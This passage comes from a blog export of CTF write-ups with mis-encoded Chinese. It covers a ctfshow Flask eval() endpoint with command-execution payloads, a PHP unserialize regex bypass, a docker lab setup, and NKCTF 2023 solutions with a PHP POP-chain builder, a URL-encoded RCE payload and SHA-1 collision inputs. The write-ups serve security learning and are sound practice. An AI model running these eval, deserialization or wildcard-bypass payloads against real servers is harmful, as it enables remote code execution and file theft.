users[username]['role']\n            return redirect(url_for('profile'))\n        else:\n            msg = 'Incorrect username/password!'\n    return render_template('login2.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\n    msg = '' \n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users:\n            msg = 'Account already exists!'\n        else:\n            users[username] = {'password': password, 'role': 'user'}\n            msg = 'You have successfully registered!'\n    return render_template('register2.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\n    if 'loggedin' in session:\n        return render_template('profile2.html', username=session['username'], role=session['role'])\n    return redirect(url_for('login'))\n\n\n@app.route('/show/')\ndef show():\n    if 'loggedin' in session:\n        return render_template('show2.html')\n\n@app.route('/download/')\ndef download():\n    if 'loggedin' in session:\n        filename = request.args.get('filename')\n        if 'filename' in request.args:              \n            return send_file(filename, as_attachment=True)\n  \n    return redirect(url_for('login'))\n\n\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n    \n\n\n@app.route('/logout/')\ndef logout():\n   session.pop('loggedin', None)\n   session.pop('id', None)\n   session.pop('username', None)\n   session.pop('role', None)\n   return redirect(url_for('login'))\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=8080)\n```\n\næ³¨æ„åˆ°è¿™é‡Œ å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ æ³¨æ„æ˜¯pythonçš„å‘½ä»¤æ‰§è¡Œå’Œphpçš„å½¢å¼ç¨æœ‰ä¸åŒ\n\n```php\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n/hello/?eval=__import__('os').popen('ls /').read()\n/hello/?eval=__import__('os').popen('cat /flag_is_h3re').read()\n```\n\nç¨å¾®è§£é‡Šä¸€ä¸‹ è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰pythonçš„å‘½ä»¤æ‰§è¡Œ æ˜¯é€šè¿‡è°ƒç”¨æ¨¡å—çš„æ–¹å¼\n\n**__import__()** å‡½æ•°ç”¨äºåŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°  \n\n**os** --- æ“ä½œç³»ç»Ÿæ¥å£æ¨¡å—\n\n**os.popen()** æ–¹æ³•ç”¨äºä»ä¸€ä¸ªå‘½ä»¤æ‰“å¼€ä¸€ä¸ªç®¡é“ã€‚  \n\n**read()** æ–¹æ³•ç”¨äºä»æ–‡ä»¶è¯»å–æŒ‡å®šçš„å­—èŠ‚æ•°ï¼Œå¦‚æœæœªç»™å®šæˆ–ä¸ºè´Ÿåˆ™è¯»å–æ‰€æœ‰ã€‚  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681711491-461b37da-6ce3-4b0d-9b1b-f5be01576642.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681726881-b115297a-f1d5-4d07-9666-f4f38e5cf138.png)\n\n# Challenge_5 easy_php\n\næºç ï¼š\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        system($this->ctfshow);\n    }\n\n}\n\n$data = $_GET['1+1>2'];\n\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n\n\n?>\n```\n\nè¿™é“é¢˜ä¸ä¼šåšï¼Œçœ‹äº†wpè¿˜æ˜¯è›®ç¥å¥‡çš„ï¼Œç®€å•åˆ†æä¸€ä¸‹\n\nåº”è¯¥æ˜¯é€šè¿‡ååºåˆ—åŒ–å»æ‰§è¡Œctfshowç±»ä¸­çš„`system()`å‡½æ•°\n\nè¿™é‡Œé¦–å…ˆè§£é™¤ä¸€ä¸‹æˆ‘å›ºæœ‰çš„æƒ³æ³•ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå½“ååºåˆ—åŒ–æ—¶é¦–å…ˆä¼šæ‰§è¡Œ__wakeupé­”æœ¯æ–¹æ³•ï¼Œè¿™é“é¢˜æ‰§è¡Œåä¼šç”¨åˆ°die()å‡½æ•°ï¼Œç¨‹åºè¿è¡Œå®Œäº†ï¼Œæˆ‘åŸä»¥ä¸ºè¦é€šè¿‡å¢åŠ å¯¹è±¡å±æ€§æ–¹æ³•å»ç»•è¿‡__wakeupå‡½æ•°ï¼Œä½†æ˜¯å‘ç°æ²¡å¿…è¦ï¼Œå› ä¸ºææ„å‡½æ•°ä¸ä¼šå—åˆ°å½±å“ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680682560289-777732f6-fecf-4574-9c71-9b1cac882a4b.png)\n\næ‰€ä»¥æ²¡å¿…è¦å»ç»•è¿‡\n\né‚£ä¹ˆè¿™é“é¢˜ç›®æœ€ä¸»è¦çš„å°±æ˜¯å»ç»•è¿‡è¿™ä¸ªæ­£åˆ™åŒ¹é…\n\n```php\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n```\n\næˆ‘ä»¬ä¼ å‚ä¸èƒ½ä»¥Oæˆ–è€…aå¼€å¤´\n\næˆ‘ä»¬éƒ½çŸ¥é“åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²é¦–å­—æ¯å°±ä¸ºO æ„ä¸ºobjectå¯¹è±¡çš„æ„æ€\n\né‚£ä¹ˆè¿™é‡Œåº”è¯¥æ€ä¹ˆç»•è¿‡å‘¢\n\nè¿™é‡Œè€ƒåˆ°äº† PHP7.3 __wakeupç»•è¿‡ï¼ŒArrayObjectå†…ç½®ç±» å¹¶ä¸”è¿™ä¸ªç±»å¯ä»¥èµ·åˆ°ç±»ä¼¼äºååºåˆ—åŒ–æˆ‘ä»¬ä¼ å…¥çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œå½“ç„¶è¿™é‡Œè¯´çš„ä¸ä¸¥è°¨ï¼Œä½†å¯ä»¥è¿™æ ·ç†è§£å‚è€ƒï¼šhttps://juejin.cn/post/7105704360155283469 \n\næ³¨æ„è¿™é‡Œåªèƒ½åœ¨php7.3ç‰ˆæœ¬ä¸‹æ‰èƒ½æˆåŠŸï¼Œä¸€å¼€å§‹å¤ç°çš„æ—¶å€™æ²¡æ³¨æ„åˆ°\n\n ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680683801763-77de8014-f72c-4c36-8e8e-b8016b18d2c3.png)\n\ncæ‰“å¤´\n\né‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆè¦ban aå­—ç¬¦å‘¢banäº†oå­—ç¬¦ä¸ä¹…è¡Œäº†å˜›\n\nå¦‚æœä¸ban a æˆ‘ä»¬å¯ä»¥ç›´æ¥åºåˆ—åŒ–æ•°ç»„å»åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ä»è€Œè¾¾åˆ°getshell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684039061-77ce25bf-492d-4fea-ab53-dc14a69e04c2.png)\n\næ˜ç™½ä¹‹åï¼Œæœ¬åœ°æ„é€ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684422756-3957d554-5eb3-4b5a-b998-426f46960407.png)\n\nè¿™é‡Œä¼ å‚çš„æ—¶å€™è®°å¾—æŠŠ1+1>2 urlç¼–ç ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684325551-252a9b8d-ed0a-4898-9ddb-f3983e2a9f6e.png)\n\nä¹‹åå°±æ˜¯è¯»å–äº†ã€‚\n\n# åè®°ï¼š\n\nè¿™æ¬¡æœ€ä¸»è¦å­¦åˆ°äº†phpåŸç”Ÿç±»çš„çŸ¥è¯†ç‚¹æŠŠï¼Œtqlï¼ï¼ï¼ï¼\n\n","tags":["phpåŸç”Ÿç±»","flask sessionä¼ªé€ ","ssti"],"categories":["ctfshow"]},{"title":"è®°ä¸€æ¬¡ç®€å•çš„dockerå¼€è®¾webé¶åœº","url":"/post/5400d97d.html","content":"\nè®°å½•ä¸€æ¬¡ç®€å•çš„dockerå¼€è®¾webé¶åœº\n\n<!--more-->\n\n# å‰æœŸå‡†å¤‡ï¼š\n\nä¸€å°äº‘æœåŠ¡å™¨(è¿™é‡Œç”¨åˆ°äº†èˆå‹çš„æœåŠ¡å™¨==)\n\ndockerç¯å¢ƒ\n\n# æ­£æ–‡ï¼š\n\né¦–å…ˆè‡ªæˆ‘è®¤è¯†ä»€ä¹ˆæ˜¯dockerï¼Œdockerå°±åƒæ˜¯ä¸€ä¸ªè£…æ°´çš„æ¯å­ï¼Œåœ¨è¿™é‡ŒæŠŠé‡Œé¢çš„æ°´å«åšé•œåƒï¼Œæˆ‘ä»¬éœ€è¦å…ˆä¸‹è½½å¥½é•œåƒï¼Œå½“è¿è¡Œé•œåƒæ—¶ï¼Œdockerä¼šå…ˆåœ¨æœ¬åœ°å¯»æ‰¾æ‰€è¦æ‰“å¼€çš„é•œåƒï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šè‡ªåŠ¨ä»dockeré•œåƒä»“åº“ä¸‹è½½ã€‚\n\nè¿™é‡Œæˆ‘å·²ç»æå‰é…ç½®å¥½äº†dockerç¯å¢ƒ ä¸Šç½‘ä¸€æœæœ‰å¾ˆå¤šå®‰è£…æ•™ç¨‹\n\n`docker version`æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680239557401-3f605a8c-793d-4257-a9f8-8db90a07ff2f.png)\n\n`docker search lamp` æŸ¥æ‰¾lampå †æ ˆé•œåƒ\n\nLAMP å †æ ˆæ˜¯å¼€å‘äººå‘˜ç”¨æ¥æ„å»ºç½‘ç«™å’Œ Web åº”ç”¨ç¨‹åºçš„å››ç§ä¸åŒè½¯ä»¶æŠ€æœ¯çš„æ†ç»‘åŒ…ã€‚\n\nLAMP æ˜¯æ“ä½œç³»ç»Ÿ Linuxã€Web æœåŠ¡å™¨ Apacheã€æ•°æ®åº“æœåŠ¡å™¨ MySQL å’Œç¼–ç¨‹è¯­è¨€ PHP çš„é¦–å­—æ¯ç¼©å†™  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244378603-6e7e24e9-493e-4cb9-8dcd-89dcc1780d88.png)\n\n`docker pull  tutum/lamp`  ä¸‹è½½tutum/lampç‰ˆæœ¬çš„ \n\n`docker iamges` ä¸‹è½½å¥½ä¹‹åæŸ¥çœ‹æœ¬åœ°é•œåƒ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244467495-06625797-38d0-4cbc-b25c-96cc941260bf.png)\n\nå°†é•œåƒå®ä¾‹åŒ– éœ€è¦åˆ†é…æœåŠ¡å™¨çš„ç«¯å£ è¿™é‡Œè¦åœ¨æœåŠ¡å™¨ç®¡ç†é¡µé¢ç»™å¼€æ”¾ä¸€ä¸ªç«¯å£ï¼ˆæ¯”å¦‚é˜¿é‡Œäº‘æˆ–è€…è…¾è®¯äº‘çš„æ§åˆ¶å°ï¼‰\n\n` docker run -d -p 9999:80 tutum/lamp  `è¿™é‡Œæˆ‘åˆ†é…çš„æ˜¯9999ç«¯å£\n\n`docker ps`æŸ¥çœ‹å½“å‰è¿è¡Œçš„å®¹å™¨ï¼Œçœ‹åˆ°äº†æˆ‘ä»¬åˆšåˆšå¯åŠ¨çš„å®¹å™¨\n\n`docker ps -a`æ˜¯æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬å½“å‰ä¸è¿è¡Œçš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245286556-0ba73951-dc0a-4cfb-84ff-670601a7ca8c.png)\n\nè¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼ŒåŒºåˆ†é•œåƒå’Œå®¹å™¨çš„åŒºåˆ«ï¼Œä¸€ä¸ªé•œåƒå¯ä»¥å¼€å¾ˆå¤šä¸ªå®¹å™¨ï¼Œç”¨å®¹å™¨idæ¥åŒºåˆ†ç›¸åŒé•œåƒå®ä¾‹åŒ–äº§ç”Ÿä¸åŒçš„å®¹å™¨ï¼Œè¿™é‡Œè¿˜æ˜¯è¦æ³¨æ„è®°å½•ä¸€ä¸‹è‡ªå·±åœ¨ç”¨çš„å®¹å™¨idï¼Œä»¥å…è¯¯åˆ äº†ï¼Œæ•´ä¸ªå®¹å™¨ä¸­çš„ä½ å·²ç»å¼„å¥½çš„æ–‡ä»¶éƒ½ä¼šè¢«åˆ é™¤ã€‚\n\n`docker exec -it 1c0d6146aa65 bash` è¿›å…¥æˆ‘ä»¬åˆšåˆšå®ä¾‹åŒ–å¥½çš„å®¹å™¨é‡Œé¢\n\n`exit`é€€å‡ºå½“å‰æ‰€åœ¨çš„å®¹å™¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245570215-8d68ad83-e2c9-4028-b1a2-b17b84d337d0.png)\n\næ¥ä¸‹æ¥å°±æ˜¯åœ¨/var/www/htmlæ–‡ä»¶ä¸‹çš„index.phpä¸‹æäº¤webé¢˜ç›®çš„æºç ï¼Œç„¶ååœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºflagçš„æ–‡ä»¶ï¼Œä¸€ä¸ªç®€å•çš„webé¶åœºå¤ç°ç¯å¢ƒå°±åˆ›å»ºå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ„‰å¿«çš„å¤ç°é¢˜ç›®äº†ï¼\n\nè¿™é‡Œæˆ‘æ”¾äº†ä¸€ä¸ªæµ‹è¯•phpä»£ç å’Œæ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246463698-c3ceb1ae-e186-4943-a0af-ad5173eba16a.png)\n\nè¿˜æœ‰å°±æ˜¯è¿™ä¸ªlampå¼€çš„å®¹å™¨å†…æ˜¯æ²¡æœ‰vimç¼–è¾‘ç¯å¢ƒçš„ï¼Œå¦‚æœç›´æ¥æƒ³åœ¨å®¹å™¨å†…å†™ä»£ç çš„è¯ï¼Œå¯ä»¥åœ¨å®¹å™¨å†…å®‰è£…vimç¼–è¾‘å™¨ã€‚\n\næµè§ˆå™¨è®¿é—®ï¼š`124.221.177.174:9999`\n\næˆåŠŸä¸€ä¸ªç®€å•çš„webé¶åœºå°±æ­å»ºå¥½äº†ï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246392826-a865a0c6-42cc-4105-bcc0-b5dd202c356e.png)\n\nå¦‚æœæƒ³å…³é—­å®¹å™¨ï¼Œæ³¨æ„è¿™é‡Œä¸æ˜¯åˆ é™¤é•œåƒæ–‡ä»¶ï¼Œåªæ˜¯å…³é—­è¿™ä¸ªé•œåƒå®ä¾‹åŒ–çš„ä¸€ä¸ªå®¹å™¨ã€‚\n\n`docker stop å®¹å™¨id`å…³é—­å®¹å™¨\n\n`docker start å®¹å™¨id`æ‰“å¼€å®¹å™¨\n\n`docker rm å®¹å™¨id` åˆ é™¤å®¹å™¨ \n\n# ç»“å°¾ï¼š\n\nè¿™é‡Œæ­¥éª¤æˆªå›¾æ”¾çš„å›¾ç‰‡æš´éœ²äº†æœåŠ¡å™¨çš„å¤–ç½‘ipå’Œä¸€äº›å…¶ä»–ä¿¡æ¯ï¼Œå¤§ä½¬ä¸è¦æ¸—é€æˆ‘å•Šï¼Œè¿™é‡Œåªæ˜¯ä¸€ä¸ªçƒ­çˆ±ctfçš„å°èœé¸¡çš„ä¸€æ¬¡è®°å½•ç½¢äº†ï¼Œåœ¨çº¿æ±‚é¥¶QWQ\n","tags":["æ­å»º","docker"],"categories":["æ­å»º"]},{"title":"NKCTF 2023 WEB WP","url":"/post/8bc42760.html","content":"\nNKCTF 2023 éƒ¨åˆ†WEB WP\n\n<!--more-->\n\n# å‰è¨€\n\nè¿™æ¬¡ç¬¬ä¸€æ¬¡ç»„é˜Ÿï¼Œä¸èˆå‹ä¸€ä½pwné€‰æ‰‹(æ”»å…‹ä¸‰é“)ï¼Œæ‰“è¿˜æ˜¯è›®ä¸é”™çš„ä¸€æ¬¡ä½“éªŒï¼Œè™½ç„¶æ’åæ²¡æœ‰å¤šé å‰å§ï¼Œåç‰¢ä¸¤å¤©ç»ˆäºå•ƒä¸‹ä¸¤é“webé¢˜ç›®ï¼Œå¬è¯´å…¶ä»–éƒ½æ˜¯1dayï¼Œè¿˜æ˜¯å¤§ä½¬çš„æ¯”èµ›å•Šï¼Œæˆ‘è¿™ç§èœç‹—å°±å•ƒå•ƒç­¾åˆ°é¢˜ç›®ï¼Œä½†æ”¶è·è¿˜æ˜¯å¾ˆå¤šå•Šã€‚\n\næœ€ååªæ”»å…‹äº†ä¸‰é“ï¼Œä¹Ÿå†™å†™wpå§ï¼Œä¹Ÿç®—æ˜¯ç»™è‡ªå·±è®°å½•ä¸€ä¸‹ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679928004403-8a6fdc30-ca46-4faf-bb59-ba788d93bf12.png)\n\n# baby_php\n\næ”¾å‡ºæºç ï¼š\n\n```plain\n<?php\n    error_reporting(0);\n    class Welcome{\n        public $name;\n        public $arg = 'oww!man!!';\n        public function __construct(){\n            $this->name = 'ItS SO CREAZY';\n        }\n        public function __destruct(){\n            if($this->name == 'welcome_to_NKCTF'){\n                echo $this->arg;\n            }\n        }\n    }\n\n    function waf($string){\n        if(preg_match('/f|l|a|g|\\*|\\?/i', $string)){\n            die(\"you are bad\");\n        }\n    }\n    class Happy{\n        public $shell;\n        public $cmd;\n        public function __invoke(){\n            $shell = $this->shell;\n            $cmd = $this->cmd;\n            waf($cmd);\n            eval($shell($cmd));\n        }\n    }\n    class Hell0{\n        public $func;\n        public function __toString(){\n            $function = $this->func;\n            $function();\n        }\n    }\n\n    if(isset($_GET['p'])){\n        unserialize($_GET['p']);\n    }else{\n        highlight_file(__FILE__);\n    }\n?>\n```\n\nä¸€é“ç»å…¸çš„ååºåˆ—åŒ–popé“¾rceé¢˜ç›®ï¼Œå°±æ˜¯æˆ‘å¡åœ¨æœ€åæ€ä¹ˆç»•wafå¾ˆä¹…ï¼Œæˆ‘å¤ªèœäº†ã€‚\n\npopé“¾æ„é€ å¾ˆç®€å•ï¼Œä¸»è¦è¯´è¯´wafçš„ç»•è¿‡æŠŠ\n\nwafåˆ†åˆ«ç¦äº†f l a g å­—ç¬¦è¿™å°±å¯¼è‡´å¾ˆå¤šlinuxå‘½ä»¤éƒ½ä¸èƒ½ç”¨äº† æ¯”å¦‚ls cat tac less tail \n\nç„¶åè¿˜ç¦äº†é€šé…ç¬¦`?` å’Œ`*`é˜²æ­¢æˆ‘ä»¬é€šè¿‡è¿™æ ·æ¨¡ç³Šæ“ä½œå»getshell  \n\nls å¯ä»¥é€šè¿‡ diræ¥ç»•è¿‡  è¯»æ–‡ä»¶ç”¨moreæ¥ç»•è¿‡\n\nç„¶åè¯»flagå°±æ˜¯å¾ˆå¤´ç–¼çš„äº‹æƒ…äº†ï¼Œè¿™é‡Œå°±æ˜¯å› ä¸ºä»–ç¦äº†é€šé…ç¬¦ç»™äº†æˆ‘å¯å‘\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679891817693-acfb04f2-5a0e-4435-97f9-fdba062697b5.png)\n\nå‚è€ƒï¼šhttps://abcfy2.gitbooks.io/linux_basic/content/first_sense_for_linux/command_learning/wildcard.html\n\nè¿˜æœ‰ä¸€ç§é€šé…ç¬¦æ˜¯`[]`å¯ä»¥åŒ¹é…æŒ‡å®šèŒƒå›´ä¸­çš„ä»»æ„å­—ç¬¦ é‚£ä¹ˆ få’Œgå°±å¯ä»¥ç”¨`[e-h]`æ¥ç»•è¿‡\n\naæ˜¯å­—æ¯è¡¨ç¬¬ä¸€ä¸ªï¼Œè¯¥æ€ä¹ˆç»•è¿‡å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ `[éæ•°å­—]`å½¢å¼:`[^0-9]` è¿™é‡Œå°–æ‹¬å·å°±æ˜¯æ’é™¤åŒ¹é…èŒƒå›´ï¼Œè¿™ä¹Ÿå°±å¯ä»¥åŒ…å«æ‰€æœ‰å­—æ¯ æ¥è¾¾åˆ°è·å–açš„æ•ˆæœäº†\n\næœ¬åœ°æ„é€ ï¼š\n\n```plain\n<?php\n    error_reporting(0);\n    class Welcome{\n        public $name;\n        public $arg = 'oww!man!!';\n        public function __construct(){\n            $this->name = 'welcome_to_NKCTF';\n        }\n    }\n\n    class Happy{\n        public $shell;\n        public $cmd;\n    }\n    class Hell0{\n        public $func;\n    }\n$a=new Welcome();\n$a->arg = new Hell0();\n$a->arg->func = new Happy();\n$a->arg->func->shell='system';    \n$a->arg->func->cmd=\"more  /[e-h]1[^0-9][e-h]\";\necho urlencode(serialize($a));\n?>\n```\n\nè®°å¾—æœ€åpayload urlç¼–ç ä¸€ä¸‹ ååºåˆ—åŒ–é¢˜ç›®çš„å¸¸ç”¨å¥—è·¯äº†\n\n```\np=O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22cmd%22%3Bs%3A24%3A%22more++%2F%5Be-h%5D1%5B%5E0-9%5D%5Be-h%5D%22%3B%7D%7D%7D\n```\n\næ‹¿åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679892001266-d44e146e-ab39-40b0-98f5-4f46ab72ee96.png)\n\n# esay_php\n\næ”¾å‡ºæºç ï¼š\n\n```plain\n<?php \n    highlight_file(__FILE__);\n    error_reporting(0);\n    if($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])){\n        if((string)$_POST['c'] != (string)$_POST['d'] && sha1($_POST['c']) === sha1($_POST['d'])){\n            if($_GET['e'] != 114514 && intval($_GET['e']) == 114514){\n                if(isset($_GET['NS_CTF.go'])){\n                    if(isset($_POST['cmd'])){\n                        if(!preg_match('/[0-9a-zA-Z]/i', $_POST['cmd'])){\n                            eval($_POST['cmd']);\n                        }else{\n                            die('error!!!!!!');\n                        }\n                    }else{\n                        die('error!!!!!');\n                    }\n                }else{\n                    die('error!!!!');\n                }\n            }else{\n                die('error!!!');\n            }\n        }else{\n            die('error!!');\n        }\n    }else{\n        die('error!');\n    }\n?>\n```\n\nè¿™æ˜¯ä¸€é“md5å¼±ç›¸ç­‰ï¼Œsha1ç¢°æ’ï¼Œphpå­—ç¬¦ä¸²è§£æç‰¹æ€§è¿™é‡Œæ˜¯è€ƒphpå‘½åè§„åˆ™åˆæ³•ä¸å¦ï¼Œè¿˜æœ‰å°±æ˜¯æ— æ•°å­—å­—æ¯rceã€‚\n\n## sha1ç¢°æ’\n\næ¥çœ‹sha1ç¢°æ’ï¼š\n\nä¹‹å‰æœ‰åšè¿‡md5å¼ºç›¸ç­‰çš„é¢˜ç›®ï¼Œå› ä¸ºè¢«stringå¼ºè½¬åŒ–äº†ï¼Œæ‰€ä»¥ä¸€äº›å¸¸è§çš„æ•°ç»„ç»•è¿‡å°±ä¸èƒ½ç”¨äº†ï¼Œåªèƒ½è€å®ç”¨è„šæœ¬ç¢°æ’ï¼Œsha1å’Œmd5åšæ³•å¾ˆç›¸ä¼¼ã€‚\n\nsha1 â€” è®¡ç®—å­—ç¬¦ä¸²çš„ sha1 æ•£åˆ—å€¼\n\nåœ¨è¿™é‡Œå…ˆè¯´ä¸€è¯´md5å¼ºç±»å‹å­—ç¬¦ä¸²è½¬æ¢åç¢°æ’ç›¸ç­‰å§\n\nè¿™é‡Œæœ‰ä¸“é—¨md5ç¢°æ’çš„è„šæœ¬ï¼šhttps://blog.csdn.net/shuaicenglou3032/article/details/118197904 \n\næœ¬åœ°æµ‹è¯•\n\nå…ˆæ‹¿åˆ°æ•£åˆ—å€¼ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926136860-9c662264-fd6e-411f-9074-2a2201872239.png)\n\næœ¬åœ°å†™ä¸€ä¸ªæµ‹è¯•demo\n\næºç ï¼š\n\n```php\n<?php \nshow_source('index.php');\n$a=$_GET['a'];\n$b=$_GET['b'];\nif((string)$a != (string)$b && md5($a) === md5($b)){\n    echo \"yes\";\n}\nelse{\n    echo \"no\";\n}\n?>\n```\n\nè¿™é‡Œæµ‹è¯•æœ€å¥½åœ¨ä½ç‰ˆæœ¬phpä¸‹æµ‹è¯•ä¸ç„¶é«˜ç‰ˆæœ¬å·²ç»è¢«ä¿®å¤äº† æˆ‘è¿™é‡Œversionæ˜¯5.3.29\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926309291-918ee00d-2b44-43fc-8424-04f9c2d48c25.png)\n\næµ‹è¯•æ˜¯å¯ä»¥é€šè¿‡è„šæœ¬ç¢°æ’\n\nå†æ¥çœ‹sha1()\n\nè¿™é‡Œæ²¡æœ‰æ‰¾åˆ°å…³äºsha1çš„ç¢°æ’è„šæœ¬ï¼Œä½†æ˜¯æ‰¾åˆ°äº†ä¸¤ä¸ªç¬¦åˆæ¡ä»¶çš„å€¼ï¼Œä¹‹åå†é‡åˆ°æ‹¿æ¥ç”¨å°±è¡Œã€‚\n\na=`%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1`\n\nb=`%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926782885-7cec8231-cd06-4dc8-b096-96e3b49887a7.png)\n\n## phpå‘½åè§„åˆ™\n\nä¸€å¼€å§‹åšçš„æ—¶å€™ä»¥ä¸ºè¿™é“é¢˜å‡ºé—®é¢˜äº†ï¼Œæœ€åå‘ç°è¿™é‡Œæœ‰å‘ã€‚\n\nå…ˆæ¥çœ‹æœ¬åœ°æµ‹è¯•ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ç»™NS_CTF.goä¼ å€¼ï¼Œä¼ å…¥åä¼šæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927046246-3e3675f4-af68-4d8e-9be3-1c63a5ebffff.png)\n\nå¯è§å½“æˆ‘ä»¬ä¼ å…¥çš„ç‚¹å·è¢«æ”¹ä¸ºäº†ä¸‹åˆ’çº¿ï¼Œè¿™é‡Œæ˜¯å› 